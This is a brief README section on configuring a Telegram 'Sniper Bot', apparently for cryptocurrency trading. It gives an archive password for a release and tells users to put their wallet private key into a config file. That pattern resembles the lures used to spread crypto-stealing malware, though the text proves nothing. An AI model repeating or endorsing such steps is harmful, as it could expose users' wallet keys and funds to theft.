#### Configure the Sniper Bot
1. Ensure you have all accompanying files required for the Telegram API.
2. If you are building from source, generate your own Telegram API credentials as sharing them in plain text is against Telegram's terms of service.
3. Clone the repository release and extract files with password `whLn1sTWT`. Edit the `address` and `private_key` fields in the `config.json` file.
